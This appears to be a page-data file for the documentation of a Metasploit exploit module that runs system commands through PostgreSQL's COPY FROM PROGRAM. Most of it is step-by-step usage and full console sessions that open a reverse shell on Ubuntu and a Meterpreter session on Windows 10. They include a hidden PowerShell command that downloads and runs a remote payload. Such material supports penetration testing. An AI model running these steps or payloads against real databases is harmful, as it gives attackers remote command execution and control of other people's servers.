{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/postgres/postgres_copy_from_program_cmd_exec","result":{"data":{"moduleMetadataJson":{"id":"85e022fd-11f9-50ff-9aea-dc1fd906de9e","name":"PostgreSQL COPY FROM PROGRAM Command Execution","fullname":"exploit/multi/postgres/postgres_copy_from_program_cmd_exec","description":"Installations running Postgres 9.3 and above have functionality which allows for the superuser\n        and users with 'pg_execute_server_program' to pipe to and from an external program using COPY.\n        This allows arbitrary command execution as though you have console access.\n\n        This module attempts to create a new table, then execute system commands in the context of\n        copying the command output into the table.\n\n        This module should work on all Postgres systems running version 9.3 and above.\n\n        For Linux & OSX systems, target 1 is used with cmd payloads such as: cmd/unix/reverse_perl\n\n        For Windows Systems, target 2 is used with powershell payloads such as: cmd/windows/powershell_reverse_tcp\n        Alternativly target 3 can be used to execute generic commands, such as a web_delivery meterpreter powershell payload\n        or other customised command.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/postgres/postgres_copy_from_program_cmd_exec","documentationSlug":"/modules/documentation/exploit/multi/postgres/postgres_copy_from_program_cmd_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module attempts to create a new table, then execute system commands in the\ncontext of copying the command output into the table.</p>\n<p>This module should work on all Postgres systems running version 9.3 and above.</p>\n<p>Download any version of PostgreSQL from 9.3 to 11.2 (Latest at time of writing)\nSet up the software and connect as the postgres superuser.\nUse the techniques described in this blogpost to verify command execution:\n<a href=\"https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5\">https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  You must be able to connect to the PostgreSQL database, and have a valid set of superuser\ncredentials, or a user in the 'pg<em>execute</em>server_program' group</p>\n<p>  Exploiting Linux/OSX:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">1. Start msfconsole\n2. use exploit/multi/postgres/postgres_copy_from_program_cmd_exec\n3. set RHOST target.ip.add.ress\n4. set payload cmd/unix/reverse_perl\n5. set PASSWORD postgres\n6. set USERNAME postgres\n7. set DATABASE postgres\n8. set LHOST my.ip.add.ress\n9. set LHOST myport\n10. exploit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Exploiting Windows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">1. Start msfconsole\n2. use exploit/multi/script/web_delivery\n3. set target 2\n4. set payload windows/meterpreter/reverse_tcp\n5. set LHOST my.ip.add.ress\n6. exploit -j\n7. Copy powershell command, add \\ to escape any single quotes\n8. use exploit/multi/postgres/postgres_copy_from_program_cmd_exec\n9. set RHOST target.ip.add.ress\n10. set COMMAND powershell... (Output from Step 7)\n11. set PASSWORD postgres\n12. set USERNAME postgres\n13. set DATABASE postgres\n14. exploit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TABLENAME</strong></p>\n<p>  The name of the table to create in the database, default is set to 'msftesttable', this table will be dropped create a new\none each time the exploit is run.</p>\n<p>  <strong>DUMP<em>TABLE</em>OUTPUT</strong></p>\n<p>  If enabled this option will perform a select statement on the created table before it is deleted. This can be used for\ndebugging if there are problems with a command being executed.</p>\n<p>  <strong>DATABASE</strong></p>\n<p>  Name of the database to connect to</p>\n<p>  <strong>USERNAME</strong></p>\n<p>  A valid username that allows access to the database</p>\n<p>  <strong>PASSWORD</strong></p>\n<p>  A valid password that allows access to the database</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"exploiting-postgresql-112-on-linux-ubuntu-1804\" style=\"position:relative;\"><a href=\"#exploiting-postgresql-112-on-linux-ubuntu-1804\" aria-label=\"exploiting postgresql 112 on linux ubuntu 1804 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploiting PostgreSQL 11.2 on Linux Ubuntu 18.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set DATABASE postgres\nDATABASE =&gt; postgres\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set USERNAME postgres\nUSERNAME =&gt; postgres\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set PASSWORD postgres\nPASSWORD =&gt; postgres\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set payload cmd/unix/reverse_perl\npayload =&gt; cmd/unix/reverse_perl\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set LHOST 192.168.0.18\nLHOST =&gt; 192.168.0.18\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set RHOSTS 192.168.0.25\nRHOSTS =&gt; 192.168.0.25\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; show options\n\nModule options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   COMMAND                     no        Send a custom command instead of a payload, use with powershell web delivery against windows\n   DATABASE   postgres         yes       The database to authenticate against\n   PASSWORD   postgres         no        The password for the specified username. Leave blank for a random password.\n   RHOSTS     192.168.0.25     yes       The target address range or CIDR identifier\n   RPORT      5432             yes       The target port (TCP)\n   TABLENAME  msftesttable     yes       A table name that doesnt exist(To avoid deletion)\n   USERNAME   postgres         yes       The username to authenticate as\n\n\nPayload options (cmd/unix/reverse_perl):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.0.18     yes       The listen address (an interface may be specified)\n   LPORT  4456             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.0.18:4456\n[*] 192.168.0.25:5432 - 192.168.0.25:5432 - PostgreSQL 11.2 (Ubuntu 11.2-1.pgdg18.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0, 64-bit\n[*] 192.168.0.25:5432 - Exploiting...\n[+] 192.168.0.25:5432 - 192.168.0.25:5432 - msftesttable dropped successfully\n[+] 192.168.0.25:5432 - 192.168.0.25:5432 - msftesttable created successfully\n[+] 192.168.0.25:5432 - 192.168.0.25:5432 - msftesttable copied successfully(valid syntax/command)\n[+] 192.168.0.25:5432 - 192.168.0.25:5432 - msftesttable dropped successfully(Cleaned)\n[*] 192.168.0.25:5432 - Exploit Succeeded\n[*] Command shell session 2 opened (192.168.0.18:4456 -&gt; 192.168.0.25:51784) at 2019-03-24 18:07:11 +0000\n\nwhoami\npostgres\nuname -a\nLinux ubuntu 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n/usr/lib/postgresql/11/bin/postgres -V\npostgres (PostgreSQL) 11.2 (Ubuntu 11.2-1.pgdg18.04+1)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"exploiting-postgresql-107-on-windows-10\" style=\"position:relative;\"><a href=\"#exploiting-postgresql-107-on-windows-10\" aria-label=\"exploiting postgresql 107 on windows 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploiting PostgreSQL 10.7 on Windows 10</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/script/web_delivery) &gt; set target 2\ntarget =&gt; 2\nmsf5 exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/script/web_delivery) &gt; set LHOST 192.168.0.18\nLHOST =&gt; 192.168.0.18\nmsf5 exploit(multi/script/web_delivery) &gt; show options\n\nModule options (exploit/multi/script/web_delivery):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT  8080             yes       The local port to listen on.\n   SSL      false            no        Negotiate SSL for incoming connections\n   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)\n   URIPATH                   no        The URI to use for this exploit (default is random)\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     192.168.0.18     yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   2   PSH\n\n\nmsf5 exploit(multi/script/web_delivery) &gt; exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 192.168.0.18:4444\n[*] Using URL: http://0.0.0.0:8080/pUDD5sy8vTTD\n[*] Local IP: http://192.168.0.18:8080/pUDD5sy8vTTD\n[*] Server started.\n[*] Run the following command on the target machine:\nmsf5 exploit(multi/script/web_delivery) &gt; powershell.exe -nop -w hidden -c $a=new-object net.webclient;$a.proxy=[Net.WebRequest]::GetSystemWebProxy();$a.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $a.downloadstring(&#39;http://192.168.0.18:8080/pUDD5sy8vTTD&#39;);\n\nmsf5 exploit(multi/script/web_delivery) &gt; use exploit/multi/postgres/postgres_copy_from_program_cmd_exec\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set DATABASE postgres\nDATABASE =&gt; postgres\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set RHOSTS 192.168.0.24\nRHOSTS =&gt; 192.168.0.24\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; show options\n\nModule options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   COMMAND                     no        Send a custom command instead of a payload, use with powershell web delivery against windows\n   DATABASE   postgres         yes       The database to authenticate against\n   PASSWORD   postgres         no        The password for the specified username. Leave blank for a random password.\n   RHOSTS     192.168.0.24     yes       The target address range or CIDR identifier\n   RPORT      5432             yes       The target port (TCP)\n   TABLENAME  msftesttable     yes       A table name that doesnt exist(To avoid deletion)\n   USERNAME   postgres         yes       The username to authenticate as\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; set COMMAND powershell.exe -nop -w hidden -c $a=new-object net.webclient;$a.proxy=[Net.WebRequest]::GetSystemWebProxy();$a.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $a.downloadstring(\\&#39;http://192.168.0.18:8080/pUDD5sy8vTTD\\&#39;);\nCOMMAND =&gt; powershell.exe -nop -w hidden -c $a=new-object net.webclient;$a.proxy=[Net.WebRequest]::GetSystemWebProxy();$a.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $a.downloadstring(&#39;http://192.168.0.18:8080/pUDD5sy8vTTD&#39;)\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; exploit\n\n[*] Started reverse TCP double handler on 192.168.0.18:4456\n[*] 192.168.0.24:5432 - 192.168.0.24:5432 - PostgreSQL 10.7, compiled by Visual C++ build 1800, 32-bit\n[*] 192.168.0.24:5432 - Exploiting...\n[+] 192.168.0.24:5432 - 192.168.0.24:5432 - msftesttable dropped successfully\n[+] 192.168.0.24:5432 - 192.168.0.24:5432 - msftesttable created successfully\n[*] 192.168.0.24     web_delivery - Delivering Payload\n[!] 192.168.0.24:5432 - 192.168.0.24:5432 - Unable to execute query: COPY msftesttable FROM PROGRAM &#39;powershell.exe -nop -w hidden -c $a=new-object net.webclient;$a.proxy=[Net.WebRequest]::GetSystemWebProxy();$a.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $a.downloadstring(&#39;&#39;http://192.168.0.18:8080/pUDD5sy8vTTD&#39;&#39;);&#39;;\n[*] 192.168.0.24:5432 - Exploit Failed\n[*] Exploit completed, but no session was created.\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt;\n[*] Sending stage (179779 bytes) to 192.168.0.24\n[*] Meterpreter session 1 opened (192.168.0.18:4444 -&gt; 192.168.0.24:50154) at 2019-03-24 17:40:59 +0000\n\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; show sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                                     Connection\n  --  ----  ----                     -----------                                     ----------\n  1         meterpreter x86/windows  NT AUTHORITY\\NETWORK SERVICE @ DESKTOP-BHTT8OP  192.168.0.18:4444 -&gt; 192.168.0.24:50154 (192.168.0.24)\n\nmsf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\NETWORK SERVICE</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"85e022fd-11f9-50ff-9aea-dc1fd906de9e"}}}